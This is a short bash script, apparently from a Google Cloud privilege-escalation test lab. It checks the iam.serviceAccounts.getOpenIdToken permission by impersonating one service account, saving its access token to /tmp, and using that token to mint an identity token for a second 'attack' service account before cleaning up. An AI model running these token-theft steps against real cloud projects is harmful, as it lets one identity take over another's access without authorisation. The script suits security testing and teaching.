#!/bin/bash

source lib/lib.sh

echo "================================================"
echo "Checking iam.serviceAccounts.getOpenIdToken"

modify_role "iam.serviceAccounts.getOpenIdToken"


# Get access token of SA to use
gcloud --impersonate-service-account="${SERVICE_ACCOUNT_ID}@${PROJECT_ID}.iam.gserviceaccount.com" \
  auth print-access-token > /tmp/privesc_gcp

# Use access token to impersonate the other SA and get its token
gcloud --access-token-file /tmp/privesc_gcp auth print-identity-token "${ATTACK_SA}@${PROJECT_ID}.iam.gserviceaccount.com" --audiences=https://example.com



# Cleaning
echo "You should see a token previous to this message"
read -p "Press any key to delete scenario... " -n1 -s
echo ""

rm /tmp/privesc_gcp

echo "================================================"
